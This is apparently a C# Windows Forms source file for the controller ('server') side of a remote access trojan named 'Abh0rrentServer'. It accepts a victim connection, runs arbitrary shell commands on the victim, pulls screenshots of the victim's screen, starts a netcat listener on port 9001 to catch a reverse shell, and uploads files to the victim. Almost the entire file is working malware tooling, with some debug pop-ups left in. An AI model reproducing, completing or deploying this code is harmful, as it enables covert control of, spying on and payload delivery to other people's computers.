
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using Microsoft.VisualBasic.ApplicationServices;
using static System.Net.Mime.MediaTypeNames;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using Application = System.Windows.Forms.Application;

namespace RATServer
{

    public partial class Abh0rrentServer : Form
    {
        static Socket handler;
        static string ipAddress;
        static Int32 port;
        static string command;
        static string recievedInformation;
        static string filetoupload;


        public Abh0rrentServer()
        {
            InitializeComponent();

        }

        public async void button1_ClickAsync(object sender, EventArgs e)
        {


            //IPHostEntry ipEntry = await Dns.GetHostEntryAsync(Dns.GetHostName());


            IPAddress ip = IPAddress.Parse(ipAddress);
            MessageBox.Show(ip.ToString(), "Info", MessageBoxButtons.OK);
            IPEndPoint ipEndPoint = new(ip, port);
            Socket server = new(ipEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            server.Bind(ipEndPoint);
            server.Listen(5);

            handler = await server.AcceptAsync();

            MessageBox.Show("Server is now listening!", "Info", MessageBoxButtons.OK);


        }

        public async void button2_Click(object sender, EventArgs e)
        {
            string followup = " 2>&1";
            string majVer;
            string minVer;

            var buffer = new byte[1024];

            if (command.Equals("version"))
            {
                var commandbytes = Encoding.UTF8.GetBytes(command);

                await handler.SendAsync(commandbytes, SocketFlags.None);

                var majVerBytes = await handler.ReceiveAsync(buffer, SocketFlags.None);
                majVer = Encoding.UTF8.GetString(buffer, 0, majVerBytes);

                label1.Text = "Windows Version: " + majVer;
            }
            else if (command.Equals("screenshot"))
            {
                string fileSize;

                var commandbytes = Encoding.UTF8.GetBytes(command);

                await handler.SendAsync(commandbytes, SocketFlags.None);

                var fileSizeBytes = await handler.ReceiveAsync(buffer, SocketFlags.None);
                fileSize = Encoding.UTF8.GetString(buffer, 0, fileSizeBytes);

                MessageBox.Show(fileSize, "Info", MessageBoxButtons.OK);

                //int iFileSize = Int32.Parse(fileSize);

                byte[] BitMapBytes = new byte[200000];

                var imageBytes = await handler.ReceiveAsync(BitMapBytes, SocketFlags.None);

                MessageBox.Show("testing", "Info", MessageBoxButtons.OK);

                if (BitMapBytes != null)
                {
                    MessageBox.Show("These are not null", "Info", MessageBoxButtons.OK);
                }
                using (var ms = new MemoryStream(BitMapBytes))
                {
                    System.Drawing.Image imgSave = System.Drawing.Image.FromStream(ms);
                    Bitmap bmSave = new Bitmap(imgSave);
                    Bitmap bmTemp = new Bitmap(bmSave);

                    Graphics grSave = Graphics.FromImage(bmTemp);
                    grSave.DrawImage(imgSave, 0, 0, imgSave.Width, imgSave.Height);

                    bmTemp.Save("C:\\Users\\noctu\\OneDrive\\Pictures\\server.jpeg");
                    bmSave.Dispose();
                    bmTemp.Dispose();
                    imgSave.Dispose();
                    grSave.Dispose();
                }


                /*Bitmap bmp;

                using (var ms = new MemoryStream(BitMapBytes))
                {
                    bmp = new Bitmap(ms);
                }
                bmp.Save("server.bmp");
                
                
                BitMapBytes[0] = 0x42;
                BitMapBytes[1] = 0x4d;
                Array.Copy(BitConverter.GetBytes(iFileSize + 54), 0, BitMapBytes, 2, 4);
                Array.Copy(BitConverter.GetBytes(0), 0, BitMapBytes, 6, 2);
                Array.Copy(BitConverter.GetBytes(54), 0, BitMapBytes, 10, 4);

                Array.Copy(BitConverter.GetBytes(40), 0, BitMapBytes, 14, 4);
                Array.Copy(BitConverter.GetBytes(Image.Width))
                */
            }
            else
            {
                command = command + followup;

                var commandbytes = Encoding.UTF8.GetBytes(command);

                await handler.SendAsync(commandbytes, SocketFlags.None);

                var recievedBytes = await handler.ReceiveAsync(buffer, SocketFlags.None);

                recievedInformation = Encoding.UTF8.GetString(buffer, 0, recievedBytes);
                label1.Text = recievedInformation;
            }


        }

        private async void button3_Click(object sender, EventArgs e)
        {
            string sCommand = "shell";

            var commandbytes = Encoding.UTF8.GetBytes(sCommand);

            Process.Start("nc64.exe", " -lvp 9001");

            await handler.SendAsync(commandbytes, SocketFlags.None);
        }

        private async void button4_Click(object sender, EventArgs e)
        {
            string sCommand = "exit";
            var commandbytes = Encoding.UTF8.GetBytes(sCommand);

            await handler.SendAsync(commandbytes, SocketFlags.None);

            try
            {
                handler.Shutdown(SocketShutdown.Both);
            }
            finally
            {
                handler.Close();
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            ipAddress = textBox1.Text;
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            port = Int32.Parse(textBox2.Text);
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {
            command = textBox3.Text;
        }

        public void label1_Click(object sender, EventArgs e)
        {

        }

        private void button5_Click(object sender, EventArgs e)
        {

            Process.GetCurrentProcess().Kill();
            Application.Exit();
        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {

            filetoupload = textBox4.Text;
        }

        private async void button6_Click(object sender, EventArgs e)
        {

            string sCommand = "upload";
            var commandbytes = Encoding.UTF8.GetBytes(sCommand);
            await handler.SendAsync(commandbytes, SocketFlags.None);

            string sFile = Path.GetFileName(filetoupload);
            MessageBox.Show(sFile, "Info", MessageBoxButtons.OK);

            var sFileBytes = Encoding.UTF8.GetBytes(sFile);
            await handler.SendAsync(sFileBytes, SocketFlags.None);


            //string fileString = File.ReadAllText(filetoupload);
            byte[] bFileBytes = File.ReadAllBytes(filetoupload);


            int filesize = bFileBytes.Length;

            MessageBox.Show(filesize.ToString(), "Info", MessageBoxButtons.OK);

            //var fileSizeByte = Encoding.UTF8.GetBytes(filesize.ToString());
            //await handler.SendAsync(fileSizeByte, SocketFlags.None);

            string base64String = Convert.ToBase64String(bFileBytes);
            var base64StringBytes = Encoding.UTF8.GetBytes(base64String);

            int base64FileSize = base64StringBytes.Length;
            var base64fileSizeByte = Encoding.UTF8.GetBytes(base64FileSize.ToString());
            await handler.SendAsync(base64fileSizeByte, SocketFlags.None);
            MessageBox.Show(base64FileSize.ToString(), "Info", MessageBoxButtons.OK);
            /*using (FileStream fileStream = File.OpenRead(filetoupload))
            {
                MemoryStream memStream = new MemoryStream();
                memStream.SetLength(fileStream.Length);
                fileStream.Read(memStream.GetBuffer(), 0, (int)fileStream.Length);
                await handler.SendAsync(memStream.GetBuffer(), SocketFlags.None);
                
                fileStream.Close();
                memStream.Close();
            }*/

            await handler.SendAsync(base64StringBytes, SocketFlags.None);

        }
    }
}
